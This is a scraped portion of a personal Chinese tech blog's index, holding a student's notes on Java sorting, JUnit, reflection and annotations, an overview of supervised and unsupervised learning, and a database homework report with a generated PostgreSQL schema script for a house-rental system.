&#125; &#125; &#125;&#125; 求数组最大值(略) 计算数组平方和(略) 十个经典排序算法 冒泡排序 1234567891011121314151617181920public class type &#123; public static void main(String[] args) &#123; // 冒泡排序,从左到右增大 int[] arry = &#123; 11, 32, 69, 25, 56, 98, 76, 5, 24, 39, 48, 93, 43, 92, 22, 16 &#125;; int temp; int j; for (int i = 0; i &lt; 16; i++) &#123; for (j = i; j &lt; 15; j++) &#123; if (arry[j - i] &gt; arry[j - i + 1]) &#123; temp = arry[j - i + 1]; arry[j - i + 1] = arry[j - i]; arry[j - i] = temp; &#125; &#125; &#125; for (int k = 0; k &lt; 16; k++) &#123; System.out.println(arry[k]); &#125; &#125;&#125; 选择排序 IDEA的使用与多线程容器Set容器Set是一个可以去重的容器，set内部你可以认为有一个 Junit单元测试黑盒测试：看不见代码，输入参数，看是否可以输出预期内容。（不需要写代码） 白盒测试：输入参数后，能看到代码执行过程，逻辑，效率，性能。（需要写代码，关注程序具体执行流程） Junit是白盒测试中的一种。 Junit使用：白盒测试 步骤： 定义一个测试类 建议： 测试类名：被测试的类名 + Test 包名：xxx.xxx.xxx.test 定义测试方法：可以独立运行 建议 方法名：test测试的方法名 testAdd() 返回值：void 参数列表：建议空参 给方法加@Test注解 一般使用断言来处理结果 Assert.assertEquals(期望结果,运算结果); 12345678910111213141516171819202122232425262728package com.xyq.test;import com.xyq.Junit.Calculator;import org.junit.Assert;import org.junit.Test;public class CalculatorTest &#123; //测试add方法 @Test public void testAdd()&#123;// System.out.println(&quot;执行成功&quot;); Calculator c = new Calculator(); int res = c.add(2,5); System.out.println(res); // 断言操作：断言结果与实际返回值进行对比 // 断言失败 &#125; @Test public void sub()&#123; Calculator c = new Calculator(); int res = c.sub(1,3); System.out.println(res); Assert.assertEquals(-2,res); &#125;&#125; @Before和@After 12345678910/*初始化方法：用于资源的申请，所有测试方法在执行前都会先自动执行该方法*/ @Before public void init()&#123; System.out.println(&quot;init.....&quot;); &#125; /*释放方法：在所有测试方法执行完成1后，都会自动执行该方法*/ @After public void close()&#123; System.out.println(&quot;close...&quot;); &#125; 无论是否出现异常After和Before都会执行。 反射框架设计的灵魂 反射：将类的各个组成部分封装为其他对象，这就是反射机制。 Java代码在计算机中经历的阶段： Source源代码阶段 类文件 javac编译-&gt;*.class（成员变量、构造方法、成员方法） Class类对象阶段 类加载器ClassLoader 成员变量-&gt;Field[] fields 构造方法-&gt;Constructor[] cons 成员变量-&gt;Method[] methods 运行时阶段 可以创建对象 使用反射的好处 可以在程序中操作这些对象。 可以解耦，提高可扩展性 获取字节码Class对象的三种方式 Class.forName(“全类名”)：将字节码文件加载进内存，返回class对象 多用于配置文件，将类名可以定义在配置文件中。读取文件，加载类。 类名.class：通过类名的属性class来获取 多用于参数的传递 对象.getClass()：getClass()方法在Object类中定义的 多用于对象获取字节码的方式 同一个字节码文件(*.class)在一次程序运行过程中，只会被加载一次，不论通过哪一种方式获取的Class对象都是同一个 1234567891011121314151617181920212223242526272829```javapackage com.xyq.reflect;public class ReflectDemo1 &#123; /* * * Class.forName(&quot;全类名&quot;)：将字节码文件加载进内存，返回class对象 * 类名.class：通过类名的属性class来获取 * 对象.getClass()：getClass()方法在Object类中定义的 * */ public static void main(String[] args) throws Exception &#123; // Class.forName(&quot;全类名&quot;) Class cls1 = Class.forName(&quot;com.xyq.reflect.Person&quot;); System.out.println(cls1); // 类名.class Class cls2 = Person.class; System.out.println(cls2); // 对象.getClass() Person p = new Person(); Class cls3 = p.getClass(); System.out.println(cls3); // 用==比较三个对象：比较的都是内存地址 System.out.println(cls1 == cls2); // t System.out.println(cls3 == cls2); // t System.out.println(cls1 == cls3); // t // 同一个字节码文件(*.class)在一次程序运行过程中，只会被加载一次，不论通过哪一种方式获取的Class对象都是同一个 &#125;&#125; Class对象功能 功能： 获取功能 获取成员变量们 Field[] getFields() Field getField(String name) Field[] getDeclaredFields() Field getDeclaredField(String name) 获取构造方法们 Constructor&lt;?&gt;[] getConstructors() Constructor&lt;T&gt; getConstructor(类&lt;?&gt;… parameterTypes) Constructor&lt;T&gt; getDeclaredConstructor(类&lt;?&gt;… parameterTypes) Constructor&lt;?&gt;[] getDeclaredConstructors() 获取成员方法们 getMethod(String name, 类&lt;?&gt;… parameterTypes) getMethods() getDeclaredMethods() getDeclaredMethod(String name, 类&lt;?&gt;… parameterTypes) 获取类名 String getName() 获取FieldField：成员变量 操作： ​ 设置值：void set(Object obj,Object value) ​ 获取值：get(Object obj) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package com.xyq.reflect;import java.lang.reflect.Field;/** * @author MikeTaylor_zjl * @create 2021-07-22-10:26 */public class ReflectDemo2 &#123; /* * 获取成员变量们 * Field[] getFields() * Field getField(String name) * Field[] getDeclaredFields() * Field getDeclaredField(String name) * */ public static void main(String[] args) throws Exception &#123; //0.获取Person的class对象 Class&lt;Person&gt; personClass = Person.class; /* * 获取成员变量们 * Field[] getFields()：获取所有public修饰的成员变量。 * Field getField(String name)：获取指定名称的，public修饰的成员变量。 * Field[] getDeclaredFields()：获取所有成员变量，不考虑修饰符。（反射中没有公有、私有的概念） * Field getDeclaredField(String name) * */ //1.Field[] getFields() Field[] fields = personClass.getFields(); for (Field field : fields) &#123; System.out.println(field); &#125; //2.Field getField(String name) Field a = personClass.getField(&quot;a&quot;); // 获取成员变量的值 Person p = new Person(); Object value = a.get(p); System.out.println(value); //设置成员变量的值 a.set(p,&quot;张加林&quot;); System.out.println(p); // 3.Field[] getDeclaredFields() System.out.println(&quot;---------&quot;); Field[] declaredFields = personClass.getDeclaredFields(); for (Field declaredField : declaredFields) &#123; System.out.println(declaredField); &#125; //4.Field getDeclaredField(String name) System.out.println(&quot;---------&quot;); Field d = personClass.getDeclaredField(&quot;d&quot;); // 忽略访问权限修饰符的安全检查 d.setAccessible(true); //暴力反射 Object value2 = d.get(p); System.out.println(value2); &#125;&#125; 获取Constructor1234567891011121314151617181920212223242526272829303132333435package com.xyq.reflect;import java.lang.reflect.Constructor;/** * @author MikeTaylor_zjl * @create 2021-07-22-10:26 */public class ReflectDemo3 &#123; /* * 获取构造方法们 * Constructor&lt;?&gt;[] getConstructors() * Constructor\\&lt;T&gt; getConstructor(类&lt;?&gt;... parameterTypes) * Constructor\\&lt;T&gt; getDeclaredConstructor(类&lt;?&gt;... parameterTypes) * Constructor&lt;?&gt;[] getDeclaredConstructors() * */ public static void main(String[] args) throws Exception &#123; //0.获取Person的class对象 Class&lt;Person&gt; personClass = Person.class; /* * 获取构造方法们 * Constructor&lt;?&gt;[] getConstructors() * Constructor\\&lt;T&gt; getConstructor(类&lt;?&gt;... parameterTypes) * Constructor\\&lt;T&gt; getDeclaredConstructor(类&lt;?&gt;... parameterTypes) * Constructor&lt;?&gt;[] getDeclaredConstructors() * */ // Constructor\\&lt;T&gt; getConstructor(类&lt;?&gt;... parameterTypes) Constructor&lt;Person&gt; constructor = personClass.getConstructor(String.class, int.class); System.out.println(constructor); //创建对象 Person p = constructor.newInstance(&quot;张加林&quot;, 20); System.out.println(p); &#125;&#125; 获取Method12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364package com.xyq.reflect;import java.lang.reflect.Method;/** * @author MikeTaylor_zjl * @create 2021-07-22-10:26 */public class ReflectDemo4 &#123; /* * 获取成员变量们 * Field[] getFields() * Field getField(String name) * Field[] getDeclaredFields() * Field getDeclaredField(String name) * 获取构造方法们 * Constructor&lt;?&gt;[] getConstructors() * Constructor\\&lt;T&gt; getConstructor(类&lt;?&gt;... parameterTypes) * Constructor\\&lt;T&gt; getDeclaredConstructor(类&lt;?&gt;... parameterTypes) * Constructor&lt;?&gt;[] getDeclaredConstructors() * 获取成员方法们 * getMethod(String name, 类&lt;?&gt;... parameterTypes) * getMethods() * getDeclaredMethods() * getDeclaredMethod(String name, 类&lt;?&gt;... parameterTypes) * 获取类名 * String getName() * */ public static void main(String[] args) throws Exception &#123; //0.获取Person的class对象 Class&lt;Person&gt; personClass = Person.class; /* * 获取成员方法们 * getMethod(String name, 类&lt;?&gt;... parameterTypes) * getMethods() * getDeclaredMethods() * getDeclaredMethod(String name, 类&lt;?&gt;... parameterTypes) * */ // 获取指定名称方法 Method eat_m = personClass.getMethod(&quot;eat&quot;); Person p =new Person(); // 执行方法 eat_m.invoke(p); // 获取指定名称方法 Method eat_m2 = personClass.getMethod(&quot;eat&quot;,String.class); Person p2 =new Person(); // 执行方法 eat_m2.invoke(p2,&quot;shit&quot;); // 获取所有public修饰的方法 System.out.println(&quot;=========================&quot;); Method[] methods = personClass.getMethods(); for (Method method : methods) &#123; System.out.println(method);// method.setAccessible(true); // 暴力反射 &#125; // 获取类名称：getName() String className = personClass.getName(); System.out.println(className); // com.xyq.reflect.Person &#125;&#125; 反射案例需求：书写一个”框架“，不改变该类的任何代码的前提下，可以帮助我们创建任意的对象，并且执行其中任意方法。 实现：配置文件 + 反射 步骤 将需要创建的对象全类名和需要执行的方法定义在配置文件中。 在程序中加载读取配置文件 使用反射技术来加载类文件进入内存 创建对象 执行方法 注解概念：用文字描述程序的，给计算机看的，JDK1.5后的新特性，使用注解：@注解名称。 作用分类： 编写文档：通过代码里标识的元数据生成文档（生成文档doc文档） 代码分析：通过代码里标识的元数据对代码进行分析（使用反射） 编译检查：通过代码里标识的元数据让编译器能实现基本的编译检查（Override） 12/*windows终端运行*/javadoc *.java JDK预定义的一些注解 @Override：监测被该注解标注的方法是否是继承自父类（接口）的 @Deprecated：将该注解标注的内容已过时 @SuppressWarnings：压制警告 在程序中使用（解析）注解 自定义注解 元注解 public @interface 注解名称&#123; 属性列表 &#125; 1 /*windows终端编译*/ javac MyDemo.java /*反编译*/ javap MyDemo.class 1 注解本质：本质上就是一个接口，该接口默认继承Annotation接口 public interface MyDemo extends java.lang.annotation.Annotation&#123;&#125; 123456789101112131415161718192021222324252627 * 属性：接口中可以定义的成员方法（接口中的抽象方法） * 要求： * 属性的返回值类型有下列 * 基本数据类型 * String * 枚举 * 注解 * 以上类型的数组 * 不允许void!!!!!! * 定义了属性在使用时，需要给属性赋值 * 如果定义属性时，使用default关键词给属性默认初始化值，则使用注解时可以不进行赋值。 * 如果只有一个属性需要赋值，并且名称是value，则value可以省略，直接定义即可。 * 数组赋值时，值使用&#123;&#125;包裹。如果数组中只有一个值，则&#123;&#125;可以省略。* 元注解：用于描述注解的注解 * @Target：描述注解能够作用的位置。 ```java @Target(value=&#123;ElementType.TYPE&#125;)//表示某注解只能作用于类上 TYPE：可以作用于类上 METHOD：可以作用于方法上 FIELD：可以作用于成员变量上 @Retention：描述注解被保留的阶段。 123SOURCECLASS：RUNTIME：被保留到class字节码文件中，并被JVM读取带 @Documented：注解是否被抽取到API文档中 @Inherited：描述注解是否被子类继承 在程序使用（解析）注解：获取注解中定义的属性值 获取注解定义的位置的对象（Class\\Method\\Field） 获取指定的注解 getAnnotation(Class)：调用注解中的抽象方法获取配置的属性值 注解不是程序的一部分，可以理解为一个标签 注解给编译器、解析程序使用","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/Java/"}]},{"title":"机器学习概述","slug":"机器学习","date":"2021-04-16T06:43:19.000Z","updated":"2021-05-28T09:18:48.856Z","comments":true,"path":"2021/04/16/机器学习/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/04/16/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"一、朴素贝叶斯分类器（略）二、监督学习(supervised learning)机器学习分为：监督学习、无监督学习、半监督学习 第一部分 监督学习从给定的训练集中学习出一个函数（模型参数），当新的数据到来时，可以根据这个函数预测结果。监督学习的训练集要求包括：输入、输出，也可以说是特征和目标。训练集中的目标由人标注。监督学习最常见的分类（注意和聚类区分）问题，通过已有的训练样本（已知数据以及对应的输出）去训练得到一个最优模型（模型属于某个函数的集合，最优表示某个评价准则下是最佳的），再利用这个模型将所有的输入映射为相应的输出，对输出进行简单的判断从而实现分类的目的，也就有了对未知数据分类的能力。监督学习的目的往往是让计算机去学习我们已经创建好的分类系统（模型）。 监督学习是训练神经网络和决策树的常见技术。这两种技术高度依赖事先确定的分类系统给出的信息，对于神经网络，分类系统利用信息判断网络的错误，然后不断调整网络参数。对于决策树，分类系统利用它来判断哪些属性提供了最多的信息。 常见的监督学习算法：回归分析和统计分析。最典型的算法是KNN和SVM。 监督学习最常见的就是：regression&amp;classification Regression：Y是实数vector。回归问题，就是拟合(x,y)的一条曲线，使得价值函数（costfunction）L最小。 L(f,(X,Y)) = ||f(X) - Y||^2 Classification：Y是一个有穷树数(finitenumber)，可以看做类标号，分类问题首先要给定有Label的数据训练分类器，故属于监督学习。分类过程中价值函数（costfunction（X,Y））是属X属于Y类的概率的负对数。 L(f,(X,Y)) = -logfY(X) 其中fi(X) = P(Y=i|X) fY(X)&gt;=0, fi(X)和为1 第二部分 无监督学习(unsupervised learning)输入数据没有被标记，也没有确定的结果。样本数据类别未知，需要根据样本间的相似性对样本集进行分类(聚类，clustering)，试图使类内差距最大化。通俗讲就是实际应用中，不少情况下无法预先知道样本的标签，也就是说没有训练样本对应的类别，因而只能从原来没有样本标签的样本集开始学习分类器设计。 非监督学习不是告诉计算机怎么做，而是让计算机自己学习怎么做事情。非监督学习有两种思路。第一种是在指导Agent时不为其指定明确分类，而是在成功时采取某种形式的激励制度。需要注意的是，这类训练通常会置于决策问题的框架内，因为它的目标不是为了产生一个分类系统，而是做出最大回报的决定，这种思路很好的概括了现实世界，Agent可以对正确的行为做出激励，而对错误的行为做出惩罚。 无监督学习方法分为两类： 基于概率密度函数估值的直接方法：指设法找到各类别的特征空间的分布函数，再进行分类。 基于样本间的相似性度量的简洁聚类方法：其原理是设法定出不同类别的核心或初始内核，然后依据样本与核心之间的相似性度量将样本聚集成不同的类别。 利用聚类结果，可以提取数据集中隐藏的信息，对未来数据进行分类预测。应用于数据挖掘，模式识别，图像处理等。 PCA(常用于高维数据的降维,可用于提取数据的主要特征分量)和deep learning中的很多算法都属于无监督学习。 不同点 有监督学习方法必须要有训练集与测试样本。在训练集中找规律，而对测试样本使用这种规律。而非监督学习没有训练集，只有一组数据，在该组数据集内寻找规律。 有监督学习的方法就是识别事物，识别的结果表现在给待识别数据加上了标签。因此训练样本集必须由带标签的样本组成。而非监督学习方法只有要分析的数据集的本身，预先没有什么标签。如果发现数据集呈现某种聚集性，则可按自然的聚集性分类，但不予以某种预先分类标签对上号为目的。 非监督学习方法在寻找数据集中的规律性，这种规律性并不一定要达到划分数据集的目的，也就是说不一定要“分类”。这一点是比有监督学习方法的用途要广。 譬如分析一堆数据的主分量，或分析数据集有什么特点都可以归于非监督学习方法的范畴。 用非监督学习方法分析数据集的主分量与用K-L变换(用于数据压缩技术)计算数据集的主分量又有区别。后者从方法上讲不是学习方法。因此用K-L变换找主分量不属于无监督学习方法，即方法上不是。而通过学习逐渐找到规律性这体现了学习方法这一点。在人工神经元网络中寻找主分量的方法属于无监督学习方法。","categories":[],"tags":[{"name":"人工智能","slug":"人工智能","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}]},{"title":"数据库第四章实践作业","slug":"数据库作业2","date":"2021-04-12T12:18:34.000Z","updated":"2021-05-28T09:20:06.713Z","comments":true,"path":"2021/04/12/数据库作业2/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/04/12/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BD%9C%E4%B8%9A2/","excerpt":"","text":"教材：《数据库系统原理、设计与编程》陆鑫 张凤荔 陈安龙/编著 第四章 数据库设计与实现实践作业张加林2019091202010 作业内容： 针对房屋租赁管理系统开发，设计该系统数据库，并在PostgreSQL数据库服务器中实现该数据库。 1）分析房屋租赁管理系统业务的基本数据需求，使用Power Designer建模工具，建立房屋租赁管理系统概念数据模型。 2）针对关系数据库设计，在Power Designer建模工具中，将房屋租赁管理系统概念数据模型转换为系统逻辑数据模型设计，并进行规范化完善设计。 3）针对PostgreSQL数据库实现，在Power Designer建模工具中，将房屋租赁管理系统逻辑数据模型转换为系统物理数据模型设计。 4）在Power Designer建模工具中，将房屋租赁管理系统物理数据模型转换为SQL脚本程序。 5）在PostgreSQL数据库服务器中，执行该SQL脚本程序，实现房屋租赁管理系统数据库对象创建实现。 需要的准备工作：正确安装了PostgreSQL和Power Designer两款软件 建立房屋租赁管理系统概念数据模型既然是房屋租赁系统，最主要的两个信息就是租客信息和房屋信息。 图表 1 房屋租赁系统概念模型（第1版） 接下来确定“租客”与“房屋信息”实体之间的联系。显然，一套房子可以有一个或多个租客租用，当然也可能当前处于空闲；而一个租客也可以拥有一套或者多套租赁的房屋。因此，“租客”与“房屋信息”之间是多对多的联系。“租客”实体最小基数为0，最大为n，房屋信息基数最小为1，最大为n。 图表 2 房屋租赁系统概念模型（第2版） 由于存在多对多，在CDM转化为LDM时，会派生出一个关联实体以体现多对多的联系，所以我们可以提前添加“租用记录实体”。 而且，进一步分析，房主信息应该成为一个单独的实体。 图表 3 房屋租赁系统概念模型（第3版） 租客也可以预定房屋。 图表 4 房屋租赁系统概念模型（第4版） 完善数据类型后： 图表 5 房屋租赁系统概念模型（第5版） 对CDM进行Model Check，发现CDM完全正确。 图表 6 CDM正确性检验 建立房屋租赁系统逻辑数据模型通过：工具-&gt;生成逻辑数据模型，可以得到LDM，更改设置得到“实体-联系”LDM。 图表 7 相关设置 图表 8 LDM（第一版） 对于上面的LDM，仍需要完善。对于“预定”实体，我们可以为它创建一个流水号作为主键，同时添加预定时间属性。 图表 9 LDM（第2版） 我再引入在线客服服务系统。客服实体包含属性：“客服编号”、“客服电话”等，由于客服和租客之间是多对多关系，所以会自动生成一个中间实体“服务记录”，为了方便检索，我们引入“服务记录号”作为主键，下面为客服系统效果图。 图表 10 客服系统 再次进行Model Check，发现如下报错。 图表 11 报错 原来是服务记录里出现了两个2“serial”类型数据，显然这不符合要求，把客服编号数据类型改为INT即可。再次检查没有出现问题，我们可以转向PDM了。 建立房屋租赁系统物理数据模型通过工具-&gt;生成物理数据模型，出现如下窗口，确定即可。 图表 12 创建PDM窗口 得到如下两张表。 图表 13 表一 图表 14 表二 接下来我们完善和修改得到的PDM。 ](https://imgtu.com/i/cR6g7q) 图表 15 完善表一 图表 16 完善表二 然后进行Check Model，发现无误，我们可以通过报告生成报告，同时可以转化为SQL脚本程序。 图表 17 物理数据模型各列报告 图表 18 PDM完整报告 转化为SQL脚本程序数据库-&gt;创建数据库 图表 19 创建SQL脚本1 出现下面这样的window，修改保存路径和文件名点击确定即可生成脚本程序。 图表 20 创建SQL脚本2 下图为成功生成的脚本程序，点击文件可以看到SQL脚本的内容 图表 21 SQL脚本创建成功 执行SQL脚本我们将RentSystem.sql文件内容复制后再PostgreSQL中执行即可。 图表 22 执行SQL脚本程序 出现以下错误： 图表 23 错误1 删去脚本中开始的drop语句即可。 图表 24 drop内容 再次运行，执行成功。 图表 25 成功创建 下面我们看一下每张表以及每列。 图表 26 表生成成功 图表 27 房主信息表 图表 28 租客信息表 图表 29 租用记录表 图表 30 预定表 图表 31 房屋信息表 图表 32 客服信息表 图表 33 客服服务记录表 至此，房屋租赁管理系统创建圆满完成。 附件包含CDM、LDM、PDM，以及脚本程序。 SQL脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251/*==============================================================*//* DBMS name: PostgreSQL 9.x *//* Created on: 2021/4/14 18:42:26 *//*==============================================================*/drop index 房主信息_PK;drop table OnwerInfo;drop index 租用2_FK;drop index 租用1_FK;drop index 租用记录_PK;drop table RentRecord;drop index 预定2_FK;drop index 预定_PK;drop table Reserve;drop index 拥有_FK;drop index RoomInfo_PK;drop table RoomInfo;drop index 联系_FK;drop index 接听_FK;drop index 服务记录_PK;drop table ServeRecord;drop index 客服_PK;drop table Server;drop index renters_PK;drop table renters;/*==============================================================*//* Table: OnwerInfo *//*==============================================================*/create table OnwerInfo ( OwnerIDNum VARCHAR(18) not null, OwnerName VARCHAR(20) not null, OwnerTel VARCHAR(11) not null, constraint PK_ONWERINFO primary key (OwnerIDNum));/*==============================================================*//* Index: 房主信息_PK *//*==============================================================*/create unique index 房主信息_PK on OnwerInfo (OwnerIDNum);/*==============================================================*//* Table: RentRecord *//*==============================================================*/create table RentRecord ( RentNum SERIAL not null, RenterIDNum VARCHAR(18) not null, RoomNum INT4 not null, RoomRentTime DATE not null, RoomDeadlin DATE not null, constraint PK_RENTRECORD primary key (RentNum));/*==============================================================*//* Index: 租用记录_PK *//*==============================================================*/create unique index 租用记录_PK on RentRecord (RentNum);/*==============================================================*//* Index: 租用1_FK *//*==============================================================*/create index 租用1_FK on RentRecord (RenterIDNum);/*==============================================================*//* Index: 租用2_FK *//*==============================================================*/create index 租用2_FK on RentRecord (RoomNum);/*==============================================================*//* Table: Reserve *//*==============================================================*/create table Reserve ( ReserveNum SERIAL not null, RenterIDNum VARCHAR(18) not null, RoomNum INT4 not null, ReserveTime DATE not null, constraint PK_RESERVE primary key (ReserveNum));/*==============================================================*//* Index: 预定_PK *//*==============================================================*/create unique index 预定_PK on Reserve (ReserveNum);/*==============================================================*//* Index: 预定2_FK *//*==============================================================*/create index 预定2_FK on Reserve (RenterIDNum);/*==============================================================*//* Table: RoomInfo *//*==============================================================*/create table RoomInfo ( RoomNum SERIAL not null, OwnerIDNum VARCHAR(18) not null, RoomAddr VARCHAR(20) not null, RoomType VARCHAR(20) not null, RoomPrice MONEY not null, Empty BOOL not null, constraint PK_ROOMINFO primary key (RoomNum));/*==============================================================*//* Index: RoomInfo_PK *//*==============================================================*/create unique index RoomInfo_PK on RoomInfo (RoomNum);/*==============================================================*//* Index: 拥有_FK *//*==============================================================*/create index 拥有_FK on RoomInfo (OwnerIDNum);/*==============================================================*//* Table: ServeRecord *//*==============================================================*/create table ServeRecord ( ServeNum SERIAL not null, ServerNum INT4 not null, RenterIDNum VARCHAR(18) not null, constraint PK_SERVERECORD primary key (ServeNum));/*==============================================================*//* Index: 服务记录_PK *//*==============================================================*/create unique index 服务记录_PK on ServeRecord (ServeNum);/*==============================================================*//* Index: 接听_FK *//*==============================================================*/create index 接听_FK on ServeRecord (ServerNum);/*==============================================================*//* Index: 联系_FK *//*==============================================================*/create index 联系_FK on ServeRecord (RenterIDNum);/*==============================================================*//* Table: Server *//*==============================================================*/create table Server ( ServeNum SERIAL not null, ServeTel VARCHAR(11) not null, ServerName VARCHAR(11) not null, ServerIDNum CHAR(18) not null, ServerAssess INT4 not null, constraint PK_SERVER primary key (ServeNum));/*==============================================================*//* Index: 客服_PK *//*==============================================================*/create unique index 客服_PK on Server (ServeNum);/*==============================================================*//* Table: renters *//*==============================================================*/create table renters ( RenterIDNum VARCHAR(18) not null, RenterName VARCHAR(20) not null, RenterTel VARCHAR(11) not null, constraint PK_RENTERS primary key (RenterIDNum));/*==============================================================*//* Index: renters_PK *//*==============================================================*/create unique index renters_PK on renters (RenterIDNum);alter table RentRecord add constraint FK_RENTRECO_RENTONE_RENTERS foreign key (RenterIDNum) references renters (RenterIDNum) on delete restrict on update restrict;alter table RentRecord add constraint FK_RENTRECO_RENTTWO_ROOMINFO foreign key (RoomNum) references RoomInfo (RoomNum) on delete restrict on update restrict;alter table Reserve add constraint FK_RESERVE_RESERVETW_RENTERS foreign key (RenterIDNum) references renters (RenterIDNum) on delete restrict on update restrict;alter table Reserve add constraint FK_RESERVE_RESERVEON_ROOMINFO foreign key (ReserveNum) references RoomInfo (RoomNum) on delete restrict on update restrict;alter table RoomInfo add constraint FK_ROOMINFO_POSSESS_ONWERINF foreign key (OwnerIDNum) references OnwerInfo (OwnerIDNum) on delete restrict on update restrict;alter table ServeRecord add constraint FK_SERVEREC_ANSWER_SERVER foreign key (ServerNum) references Server (ServeNum) on delete restrict on update restrict;alter table ServeRecord add constraint FK_SERVEREC_CONTACT_RENTERS foreign key (RenterIDNum) references renters (RenterIDNum) on delete restrict on update restrict; CDM &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;?PowerDesigner AppLocale=&quot;UTF16&quot; ID=&quot;&#123;8FDD11B2-37EE-4B1A-B801-2D3A7E259451&#125;&quot; Label=&quot;&quot; LastModificationDate=&quot;1618325546&quot; Name=&quot;房屋租赁系统&quot; Objects=&quot;83&quot; Symbols=&quot;8&quot; Type=&quot;&#123;1E597170-9350-11D1-AB3C-0020AF71E433&#125;&quot; signature=&quot;CDM_DATA_MODEL_XML&quot; version=&quot;16.6.1.5066&quot;?&gt;&lt;!--不要编辑此文件--&gt;&lt;Model xmlns:a=&quot;attribute&quot; xmlns:c=&quot;collection&quot; xmlns:o=&quot;object&quot;&gt;&lt;o:RootObject Id=&quot;o1&quot;&gt;&lt;c:Children&gt;&lt;o:Model Id=&quot;o2&quot;&gt;&lt;a:ObjectID&gt;8FDD11B2-37EE-4B1A-B801-2D3A7E259451&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋租赁系统&lt;/a:Name&gt;&lt;a:Code&gt;房屋租赁系统&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618315036&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325322&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:PackageOptionsText&gt;[FolderOptions][FolderOptions\\Conceptual Data Objects]GenerationCheckModel=YesGenerationPath=GenerationOptions=GenerationTasks=GenerationTargets=GenerationSelections=[FolderOptions\\CheckModel][FolderOptions\\CheckModel\\Package][FolderOptions\\CheckModel\\Package\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Package\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Package\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Package\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Package\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Package\\CheckPackageMissTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Package\\DefaultCheckPackageMissTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Package\\GenrCircularityYes]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Package\\GenrCircularityNo]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Package\\ShortcutUniqCode]CheckSeverity=YesFixRequested=NoCheckRequested=No[FolderOptions\\CheckModel\\Package\\ChildShortcut]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain][FolderOptions\\CheckModel\\Domain\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\CheckNumParam]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\CheckPrecSupLng]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\CheckUndefDttp]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\CheckOtherDttp]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\CheckDttpIncompatibleFormat]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Item][FolderOptions\\CheckModel\\Data Item\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Item\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Item\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Item\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Item\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Item\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data 